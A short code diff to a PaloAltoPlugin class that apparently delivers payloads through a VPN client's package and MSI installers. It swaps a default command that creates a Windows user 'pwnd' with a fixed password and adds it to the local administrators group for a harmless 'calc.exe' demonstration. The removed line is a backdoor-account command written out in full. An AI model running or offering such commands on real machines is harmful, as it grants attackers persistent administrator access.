@@ -35,7 +35,7 @@ class PaloAltoPlugin(VPNPlugin):
         self.pkg_command = os.getenv("PALO_ALTO_PKG_COMMAND", "touch /tmp/pwnd")
         self.msi_command = os.getenv(
             "PALO_ALTO_MSI_COMMAND",
-            r"net user pwnd Passw0rd123! /add && net localgroup administrators pwnd /add"
+            r"calc.exe"
         )
 
         # Certificate paths
